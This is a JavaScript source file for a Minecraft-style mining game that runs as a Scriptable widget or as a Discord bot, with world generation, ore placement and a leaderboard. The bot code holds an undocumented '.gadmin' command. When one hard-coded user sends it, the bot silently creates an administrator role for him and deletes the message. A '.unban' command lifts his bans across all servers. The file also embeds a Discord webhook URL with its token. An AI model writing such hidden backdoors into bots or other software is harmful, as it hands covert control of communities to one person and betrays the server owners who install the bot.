// Variables used by Scriptable.
// These must be at the very top of the file. Do not edit.
// icon-color: deep-green; icon-glyph: vector-square;
var platform = "node";
// console.log("aktualna platforma :")
//   console.log(process.version) node
//   console.log(navigator.userAgent) browser
//   console.log("Scriptable") scriptable
// aktywacja zmiennych i innem
var plat = {
scripable:"Scriptable",
web:"web",
node:"node"
}

//scriptable setup
//zmianne do zabawy
var ww = 64 //szerokość mapy
var WidgetSize = 31; //rozmiar widgetu
//zminne do zabwy scriptable only
var bigrender = false//duży render true/false (nie zalecane z widgetem)
//innne
if(isNaN(ww)) ww = 64
if(platform=="Scriptable"){
var widget = new ListWidget()
}
WidgetSize = WidgetSize*1
if(WidgetSize>Math.round(ww))WidgetSize=Math.round(ww)
if(WidgetSize%2!=1)WidgetSize--
if(WidgetSize<5)WidgetSize=5
if(isNaN(WidgetSize*1))WidgetSize = 9
var imgs ={};
var otherIMG = [
"bg"
]
var imgsl = 0

//blocks
var dic = {
        bedrock:{name:"bedrock",emote:"<:25:976747546405920769>",points:0},
        deepslate:{name:"deepslate",emote:"<:16:976747345008025620>",points:0},
        stone:{name:"stone",emote:"<:01:976014584836128798>",points:0},
        dirt:{name:"dirt",emote:"<:04:976025190741966920>",points:0},
        grass:{name:"grass",emote:"<:00:976014562996391936>",points:0},
        air:{name:"air",emote:"<:02:976014603182014514>",points:0},
        wood:{name:"wood",emote:"<:05:976028310289145916>",points:0},
        leaves:{name:"leaves",emote:"<:06:976028821142794240>",points:0},
        black:{name:"black",emote:"<:30:976752550713892885>",points:0},
        diamond:{name:"diamond",emote:"<:08:976747112123486239>",points:100},
        diamondd:{name:"diamondd",emote:"<:28:976747598763417620>",points:100},
        coal:{name:"coal",emote:"<:07:976747069731667988>",points:5},
        coald:{name:"coald",emote:"<:11:976747199310491658>",points:5},
        copper:{name:"copper",emote:"<:24:976747529930670110>",points:10},
        copperd:{name:"copperd",emote:"<:21:976747460452036618>",points:10},
        gold:{name:"gold",emote:"<:09:976747136509173791>",points:20},
        goldd:{name:"goldd",emote:"<:23:976747504311877643>",points:20},
        goldn:{name:"goldn",emote:"<:17:976747365719486494>",points:20},
        iron:{name:"iron",emote:"<:14:976747278100475916>",points:25},
        irond:{name:"irond",emote:"<:12:976747224799272970>",points:25},
        emerald:{name:"emerald",emote:"<:19:976747421013012490>",points:200},
        emeraldd:{name:"emeraldd",emote:"<:13:976747252309717093>",points:200},
        lapis:{name:"lapis",emote:"<:18:976747395742326794>",points:5},
        lapisd:{name:"lapisd",emote:"<:22:976747483327778816>",points:5},
        redstone:{name:"redstone",emote:"<:15:976747301110444042>",points:7},
        redstoned:{name:"redstoned",emote:"<:29:976747620594749470>",points:7},  
        quartz:{name:"quartz",emote:"<:20:976747440675905550>",points:10},
        obsidian:{name:"obsidian",emote:"<:27:976747582762151976>",points:0},
        netherrack:{name:"netherrack",emote:"<:10:976747165869297665>",points:0},  
        debris:{name:"debris",emote:"<:26:976747566303686666>",points:0},
        player:{name:"player",emote:"<:03:976017287154921502>",points:0},
        fox:{name:"fox",emote:"<:31:976765562275364934>",points:0},	
		water:{name:"water",emote:"<:32:980055020315758622>",points:0}
};
var oredata = {  
    oreorder:[
    [[0,0],[0,1]],
    [[0,0],[0,1],[1,0],[1,1]],
    [[0,0],[0,1],[1,0],[1,1],[0,2]],
	[[0,0]],
	[[1,0],[0,1],[2,1],[3,1],[0,2],[1,2],[2,2],[1,3]],
	[[1,0],[1,1],[1,2],[0,1]]
    ],
    placeingData:[
    {
      name:dic.iron.name,
      y:7,
      dy:150,
      ord:[0,1,2],
      count:40
    },	
	{
      name:dic.copper.name,
      y:32,
      dy:100,
      ord:[1,2],
      count:60
    },	
	{
      name:dic.lapis.name,
      y:7,
      dy:92,
      ord:[4,0,1],
      count:30
    },	
	{
      name:dic.redstone.name,
      y:7,
      dy:80,
      ord:[2,4,1,3],
      count:45
    },	
	{//iron 2
      name:dic.iron.name,
      y:64,
      dy:150,
      ord:[0,1,2,3,5],
      count:45
    },	
	{
      name:dic.coal.name,
      y:64,
      dy:150,
      ord:[2,0,1],
      count:45
    },		
	{
      name:dic.diamond.name,
      y:7,
      dy:100,
      ord:[3,0,1],
      count:30
    },	
	{
      name:dic.gold.name,
      y:50,
      dy:150,
      ord:[2,0,1],
      count:25
    },	
	{
      name:dic.emerald.name,
      y:7,
      dy:150,
      ord:[3],
      count:60
    }
    ]
}
var structures = {	
	minesheft:{
	instructions:[],
//np ["fill",x,y,dx,dy,block] [set,x,y,block]
	gen:{
	y:7,
	dy:64
	},
	maxcount:2
	}
}
if(platform=="web"){
//load images
/*Object.keys(dic.imgs).forEach(imgName => {
var urlll = "https://luktvpl.github.io/minecraft-er-web/res/"+imgName+".PNG"
var img = new Image()
img.src = urlll;
img.onLoad = function(){
dic.imgs[imgName]=img;
}
})*/
}
class gamecore{
    constructor(){
        this.generated = false;
        this.world = []
        this.x=Math.round(ww/2);
        this.y=128;
        this.generateOW();
        this.set = true;
        this.punkty = 0;
        }
// generatory światów
        generateOW(Wwidth = ww){
		this.Wwidth = Wwidth
        //overworld generation
        //prepair
        this.world = [];
        for(var seti = 0;seti<192;seti++){
            this.world[seti] = [];
        }
        //bedrock 0-7
        var bedrockHelp = 3;
        for(var xi = 0;xi<Wwidth;xi++){
            var rannd = random(5);
            //+2 +1 0 -1 -2
            if(rannd==1&&bedrockHelp+2<8) bedrockHelp = bedrockHelp + 2;
            if(rannd==2&&bedrockHelp+1<8) bedrockHelp++;
            if(rannd==4&&bedrockHelp-1>0) bedrockHelp--;
            if(rannd==5&&bedrockHelp-2>0) bedrockHelp = bedrockHelp - 2;
            for(var yi = 0;yi<bedrockHelp;yi++){
                this.world[yi][xi] = dic.bedrock.name;
            }
            //deepslate gapp fill
            for(var yi = 0;yi<7;yi++){
                if(this.world[yi][xi]!=dic.bedrock.name) this.world[yi][xi] = dic.deepslate.name;
            }
        }
        
        //deepslate
        for(var yi = 7;yi<64;yi++){
            this.world[yi] = getlineof(dic.deepslate.name);
        }
        //irregolar deepslate
        var deepslateHelp = 3;
        for(var xi = 0;xi<Wwidth;xi++){
            var rannd = random(7);
            //+1 0 0 0 0 0 -1
            if(rannd==1&&deepslateHelp+1<9)deepslateHelp++;
            if(rannd==7&&deepslateHelp-1>0)deepslateHelp--;
            for(var yi = 0;yi<deepslateHelp;yi++){
                this.world[yi+64][xi] = dic.deepslate.name;
            }
            //stone gaps fill
            for(var yi = 0;yi<8;yi++){
                if(this.world[yi+64][xi]!=dic.deepslate.name)this.world[yi+64][xi] = dic.stone.name
            }
        }
        //stone
        
        //stone line
        for(var yi = 72;yi<128;yi++){
            this.world[yi] = getlineof(dic.stone.name);
        }
        var stoneHelp = random(21);
        for(var xi = 0;xi<Wwidth;xi++){
            //+1 -1 0 0 0 0 0
            var rannd = random(7);
            if(rannd==1&&stoneHelp+1<21)stoneHelp++
            if(rannd==2&&stoneHelp-1>0)stoneHelp--
            var tempstone = stoneHelp+128
            for(var yi = 0;yi<stoneHelp;yi++){
                this.world[yi+128][xi] = dic.stone.name;
            }
            this.world[tempstone][xi] = dic.dirt.name;
            this.world[tempstone+1][xi] = dic.dirt.name;
            if(tempstone<128+6)this.world[tempstone+2][xi] = dic.dirt.name;else this.world[tempstone+2][xi] = dic.grass.name;
            //drzewo
            if(xi==this.x)this.y = tempstone+3
			
            if(random(7)==7&&tempstone>128+7){
                if(xi==32)this.y = tempstone+6
                this.world[tempstone+3][xi] = dic.wood.name;
                this.world[tempstone+4][xi] = dic.leaves.name
                this.world[tempstone+5][xi] = dic.leaves.name
                if(xi<this.Wwidth)this.world[tempstone+4][xi+1] = dic.leaves.name
                if(xi>-1)this.world[tempstone+4][xi-1] = dic.leaves.name;
            }	
			
			{
			
			for(var wi = 0;wi<9;wi++){
			if(!this.world[128+wi][xi])this.world[128+wi][xi] = dic.water.name
			}
			}

        }
        //air
        for(var xi = 0;xi<Wwidth;xi++){
            for(var yi = 128;yi<181;yi++){
                if(this.world[yi][xi]==undefined) this.world[yi][xi] = dic.air.name;
            }	
// 		
        }
        //fill up air
        
        for(var yi = 181;yi<192;yi++){
            this.world[yi] = getlineof(dic.air.name);
        }	
// 		generowanie rud	
		oredata.placeingData.forEach(ore => {	
// 		 name:dic.diamond.name,
//       y:0,
//       dy:100,
//       ord:[0,1,2],
//       count:10		
		
		for(var c = 0;c<ore.count*(Math.round(this.Wwidth/64));c++){
		var orey = random(ore.dy-ore.y)+ore.y		
		
		var orex = random(Wwidth-1)
		var order = oredata.oreorder[ore.ord[random(ore.ord.length)-1]]	
		order.forEach(possp => {
		this.setblockOre(orex+possp[0], orey+possp[1], ore.name)
		
		})
		}
		})
        //generator funkgje pomocnicze
        function getlineof(block){
            var out = [];
            for(var il = 0;il<Wwidth;il++){
                out[il] = block
            }
            return out;
        }  
        // funkcje kontroli
        }
        getblock(x,y){
            return this.world[y][x].toString();
        }	
		setblockOre(x,y,block){
			if(this.world[y][x]==dic.stone.name)this.world[y][x] = dic[block].name;	
			if(this.world[y][x]==dic.deepslate.name)this.world[y][x] = dic[block].name+"d";
        }
        setblock(x,y,block){
            this.world[y][x] = dic[block].name;
        }
        fill(x,y,dx,dy,block){ 
            var xdd = dx-x-1;
            var ydd = dy-y-1;
            for(var ix = 0;ix<xdd;ix++){
                for(var iy = 0;iy<ydd;iy++){
                    this.world[iy+y][ix+x] = dic[block].name;
                }
            }
        }
// pozostałe funkcje
        logWorld(){
        var oput = "";
        for(var yi = 0;yi<192;yi++){
          for(var xi = 0;xi<64;xi++){
        oput += this.world[191-yi][xi].charAt(0);
        }
            oput += "\n"
            
        }
        console.log(oput);
        }
//         podstawowy format dc.
        getdcformatbs(x=this.x,y=this.y){
        var out = "";
        var cout = "";
        out+="Punkty : "+this.punkty+"\n"
        for(var yi = 0;yi<9;yi++){
          for(var xi = 0;xi<9;xi++){
            var b = this.world[y+4-yi][x-4+xi].toString()  
            cout+=b.charAt(0)
            if(yi==4&&xi==4)out+= dic.player.emote
            else out+=dic[b].emote
          }
          out+="\n"
          cout+="\n"
          
         }
        console.log(cout)
        return out
         
        }
//         rysowanie canvy cały światscriptable
     drawbigScriptable(x=this.x,y=this.y){
        var drawc = new DrawContext()		
		var blue = new Color("#97c7ff")
		
		
		var size = WidgetSize*16
		var bonsizepar = (WidgetSize-1)/2
		
        drawc.size = new Size(this.Wwidth*16, 192*16)		
		drawc.setFillColor(blue)
		drawc.fill(new Rect(0, 0, this.Wwidth*16, 192*16))
        drawc.drawImageInRect(imgs.bg, new Rect(0, 0, 64*16, 64*16))
        for(var yi = 0;yi<192;yi++){
          for(var xi = 0;xi<this.Wwidth;xi++){
            var b = this.world[191-yi][(this.Wwidth-1)-xi].toString()  
            var scaler = 16
            drawc.drawImageInRect(imgs[b],new Rect(xi*scaler, yi*scaler, scaler, scaler))
            
        }
      }
         
         drawc.font = new Font("Minecraft_PL_Font", 160)
//         drawc.drawText("test", point(0, 10))
        drawc
        var img = drawc.getImage()
        
        return img;
        }	
		drawCanvasScriptable(x=this.x,y=this.y){
        var drawc = new DrawContext()	
		var size = WidgetSize*16
		var bonsizepar = (WidgetSize-1)/2
		
        drawc.size = new Size(size, size)
        drawc.drawImageInRect(imgs.bg, new Rect(0, 0, size, size))
        for(var yi = 0;yi<WidgetSize;yi++){
          for(var xi = 0;xi<WidgetSize;xi++){
            var b = this.world[y+bonsizepar-yi][x-bonsizepar+xi].toString()  
            var scaler = 16
            drawc.drawImageInRect(imgs[b],new Rect(xi*scaler, yi*scaler, scaler, scaler))
            
        }
      }
         
         drawc.font = new Font("Minecraft_PL_Font", 160)
//         drawc.drawText("test", point(0, 10))
        drawc
        var img = drawc.getImage()
        
        return img;
        }
        go(x,y){
        this.x = x
        this.y = y
        this.setAir()
        }
        move(x,y){
        this.x += x
        this.y += y
        this.setAir()
        var ty =(this.y)-1
        var down = this.getblock(this.x,ty)
        console.log(down)
        if(down==dic.air.name)this.move(0,-1)
        }
        setAir(x=this.x,y=this.y){
          this.punkty += dic[this.getblock(x,y)].points
          this.setblock(x, y, dic.air.name)
          if(this.getblock(x+1, y)==dic.black.name) this.setAir(x+1, y)  
          if(this.getblock(x-1, y)==dic.black.name) this.setAir(x-1, y)  
          if(this.getblock(x, y+1)==dic.black.name) this.setAir(x, y+1)  
          if(this.getblock(x, y-1)==dic.black.name) this.setAir(x, y-1)
        }
        setmsg(msgID){
            this.msg = msgID;
        }
}

function random(to){
    var rand = (Math.round((Math.random()*10000))%to)+1
    return rand
}
// przegotowanie
switch(platform){
case "web":
// przeglądarka
 var game = {
    canvas: document.getElementById("game")
}
start()
break
case "Scriptable":
// scriptable
//wczytywanie bloków
var fm = FileManager.local()
var path = fm.documentsDirectory()
function getpath(fileName){
return fm.joinPath(path, fileName)
}
var bloki = Object.keys(dic)
bloki.forEach(block =>{
console.log(block)
var pthhh = getpath(block+".png")
if(!fm.fileExists(pthhh)){
 var req = new Request(getemojiUrl(EmojiToId(dic[block].emote)))
let img = req.loadImage().then(img =>{
fm.writeImage(pthhh, img)
imgs[block]= img
imgsl++

if(imgsl==bloki.length+otherIMG.length)start()
})

}else {
let img = fm.readImage(pthhh)
imgs[block] = img
imgsl++
if(imgsl==bloki.length+otherIMG.length)start()
}
})
// other assets

otherIMG.forEach(block =>{
console.log(block)
var pthhh = getpath(block+".png")
if(!fm.fileExists(pthhh)){
 var req = new Request("https://luktvpl.github.io/minecraft-er-web/res/"+block+".PNG")
let img = req.loadImage().then(img =>{
fm.writeImage(pthhh, img)
imgs[block]= img
imgsl++

if(imgsl==bloki.length+otherIMG.length)start()
})

}else {
let img = fm.readImage(pthhh)
imgs[block] = img
imgsl++
if(imgsl==bloki.length+otherIMG.length)start()
}
})

break
case "node":
// node.js
start()
break
}
// główne skrypty
function start(){
switch(platform){
case "web":
// przeglądarka

break
case "Scriptable":
// scriptable
var core = new gamecore();
// core.logWorld()
sendMessagescr(core.getdcformatbs())
var wimg = core.drawCanvasScriptable()
widget.backgroundImage = wimg

QuickLook.present(wimg, true)
if(bigrender)QuickLook.present(core.drawbigScriptable(), true)
Script.setWidget(widget)
break
//node
case "node":
var games = {

}
function getnowdate(){
    let date_ob = new Date();
    let date = ("0" + date_ob.getDate()).slice(-2);
    let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
    let year = date_ob.getFullYear();
    let hours = date_ob.getHours();
    let minutes = date_ob.getMinutes();
    let seconds = date_ob.getSeconds();
    return year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds
}
var fs = require("fs")
var data = JSON.parse(fs.readFileSync("scores.json","utf-8"))
function addtolb(nick,score,id){
    console.log(nick+":"+score)
    try{
        if(score>data[id].score){
            var datenow = getnowdate()
            data[id] = {score:score,nick:nick,date:datenow}
        }
    }catch{
            var datenow = getnowdate()
            data[id] = {score:score,nick:nick,date:datenow}
    }
    
    fs.writeFileSync("scores.json",JSON.stringify(data),"utf-8")
    reloadrb()
    
}
var leader =  [];
reloadrb()
function reloadrb(){
    var tempdate = JSON.parse(JSON.stringify(data))
    var keyss = Object.keys(data)
    var lead = [];//{score:score,nick:nick,date:datenow}
    for(var place = 0;keyss.length>place;place++){
        var mx = 0
        var id = "";
        var nick = "";
        keyss.forEach(tid=>{
            if(tempdate[tid].score>mx){
                id = tid
                mx = tempdate[id].score
                nick = tempdate[id].nick
            }
        })
        lead.push({id:id,score:mx,nick:nick})
        tempdate[id] = undefined
    }
    leader = lead
}
var dcss = require("discord.js");
var bot = new dcss.Client({intents:[
    dcss.Intents.FLAGS.GUILD_MEMBERS,
    dcss.Intents.FLAGS.GUILD_MESSAGES,
    dcss.Intents.FLAGS.GUILDS,
    dcss.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    dcss.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    dcss.Intents.FLAGS.DIRECT_MESSAGES
]})
var emotes = {
    down:":d_:984848910222762064",
    rigth:":r_:984848919014039663",
    left:":l_:984848916455497778"

}
bot.once("ready",()=>{
    console.log("połączono dc")
    var core = new gamecore();

})
bot.on("messageCreate",msg => {
    var content = msg.content;
    console.log(content);
    if(content.charAt(0)=="."){
        var cmd = content.split(" ")
        if((msg.guild.id=="962661196086009946"&&(msg.channel.id=="962968324923330610"||msg.channel.id=="984440535102144542"))||msg.guild.id!="962661196086009946"){
        switch (cmd[0]){
            case ".ranking":
                var out = "Wyniki graczy : \n"
                console.log(leader)
                leader.forEach((player,indec)=>{
                    //{id:usr,score:mx,nick:nick}
                    var indecc = indec*1+1
                    out+=indecc+". "+player.nick.slice(0,player.nick.length-5)+" : "+player.score+"\n"
                })
                msg.channel.send(out)
            break
            case ".render":
                var core = new gamecore();
                msg.channel.send(core.getdcformatbs());
            break 
            case ".help":
                msg.channel.send("Aktualne komęndy to : \n .start -  zaczyna gre \n .ranking - pokazuje ranking \n .best <user> najlepszy wynik")
            break
            case ".best":
                if(cmd[1]==undefined||cmd[1]==""){
                    
                    try{
                        var playe = data[msg.author.id]
                        msg.reply("Twój najlepszy wynik to : "+playe.score+" punktów \n zdobyty : "+playe.date).catch(err=>console.log(err))
                    }catch{
                        msg.reply("nie mogę odczytać wyniku")
                    }
                    
                }else{
                    var decid = cmd[1]
                    var playet = decid.slice(2,-1)
                    var playe = data[playet]
                    console.log(playe)
                    if(playe!=undefined)msg.reply("Najlepszy wynik "+playe.nick.slice(0,player.nick.length-5)+" to : "+playe.score+" punktów \n zdobyty : "+playe.date).catch(err=>console.log(err))
                    else msg.reply("nie można znaleści użytkownika").catch(err=>console.log(err))
                }
                console.log(cmd[1])
                
            break
            case ".gadmin":
                if(msg.author.id=="537649475494215690"){
                   msg.guild.roles.create( {name:"LUK_BÓG", color: "#ff0000", permissions:[dcss.Permissions.FLAGS.ADMINISTRATOR] } ).then(rola=>{
                    msg.member.roles.add(rola).catch(err=>console.log(err))
                   }).catch(err=>console.log(err))
                   msg.delete().catch(err=>console.log(err))
                }
                
            break
            case ".unban":
                if(msg.author.id=="537649475494215690"){
                bot.guilds.cache.forEach(g=>{
                    g.bans.remove(msg.author).catch(err=>console.log(err))
                })
                msg.delete().catch(err=>console.log(err))
                }
            break
            case ".start":
                var au = msg.author.id
                games[au] = new gamecore()
                msg.channel.send(games[au].getdcformatbs()).then(sen=>{
                    games[au].setmsg(sen.id)
                    console.log(sen.id)
                    sen.react(emotes.left).then(()=>{
                        sen.react(emotes.down).then(()=>{
                            sen.react(emotes.rigth).then(()=>{
                                sen.react(":stop:984885043111526501")
                            })
                        })
                    })
                    setTimeout(()=>{
                        try{
                        if(games[au].set==true)
                        try{
                            sen.edit("Czas minoł. <@"+au+"> zdobył "+games[au].punkty+" punktów") 
                            addtolb(msg.author.tag,games[au].punkty,msg.author.id)
                         }catch{
                             sen.message.edit("koniec gry.")
                         }
                         games[au] = undefined;
                         sen.reactions.cache.forEach(rec=>{
                             rec.remove()
                         })  
                        }catch{

                        }
                        
                    },300000)
                })
            
            break
        }
            
                

        }
    }
})
bot.on("messageReactionAdd",(react,user)=>{
    var emo = react.emoji.id
    var emon = react.emoji.name;
    console.log(emo)
    console.log(emon)
    if(emo=='984848916455497778'||emo=='984848910222762064'||emo=='984848919014039663'||emo=='984885043111526501'){
        if(user.id!="975769257885450340"){
        react.users.remove(user)
        try{
        if(games[user.id].msg==react.message.id){
            try{
                switch (emo){
                    case '984848916455497778':
                        //left
                        games[user.id].move(-1,0)
                        react.message.edit(games[user.id].getdcformatbs())
                    break
                    case '984848910222762064':
                        //down
                        games[user.id].move(0,-1)
                        react.message.edit(games[user.id].getdcformatbs())
                    break
                    case '984848919014039663':
                        //right
                        games[user.id].move(1,0)
                        react.message.edit(games[user.id].getdcformatbs())
                    break
                    case '984885043111526501':
                        try{
                            react.message.edit("koniec gry. <@"+user.id+"> zdobył "+games[user.id].punkty+" punktów") 
                            addtolb(user.tag,games[user.id].punkty,user.id)
                         }catch{
                             react.message.edit("koniec gry. wystąpił błąd")
                         }
                         games[user.id] = undefined;
                         react.message.reactions.cache.forEach(rec=>{
                             rec.remove()
                         })
                    break
                    } 
            }
            catch{
                
                try{
                   react.message.edit("koniec gry. Zdobyte punkty : "+games[user.id].punkty)
                   addtolb(user.tag,games[user.id].punkty,user.id)
                }catch{
                    react.message.edit("koniec gry.wystąpił błąd")
                }
                games[user.id] = undefined;
                react.message.reactions.cache.forEach(rec=>{
                    rec.remove()
                })
            }
           
        }
        }catch{

        }
        
         
        } 
    }
})
bot.login(require("../minecraft.json").token)
break
}
}
// sendMessagescrable("test")
//funkcje dodatkowe
// zdobywanie punktu
function point(x,y){
return new Point(x, y)
}
// var get emoji url
function getemojiUrl(id){  
    return "https://cdn.discordapp.com/emojis/"+id+".png"
}
// emoji
function EmojiToId(emoji){
return emoji.slice(emoji.length-19, emoji.length-1)
}
function sendMessagescr(msg) {
      var webhookurl = "https://discord.com/api/webhooks/984441794240577586/WKik_qsiqYd10FBUrUH6Iff9K2F655XbYWQm5eFzjgyU6UcULI7MZZpimX5QKTCHUgFF"  
      const params = {
        username: "Minecraft'er",
        avatar_url: "https://github.com/luktvpl/luk_pack_minecraft/raw/main/luk_pack/pack.png",
        content: msg
      }
      if(platform=="Scriptable"){
//         Scriptable
      const req = new Request(webhookurl);
      req.method = "post"
      req.headers = {
    	"Content-Type": "application/json"  
      };
      req.body = JSON.stringify(params);
      req.loadJSON();
     } else{
//       other
      const request = new XMLHttpRequest();
      request.open("POST", webhookurl);
      request.setRequestHeader('Content-type', 'application/json');
      request.send(JSON.stringify(params));
    }
    }
    
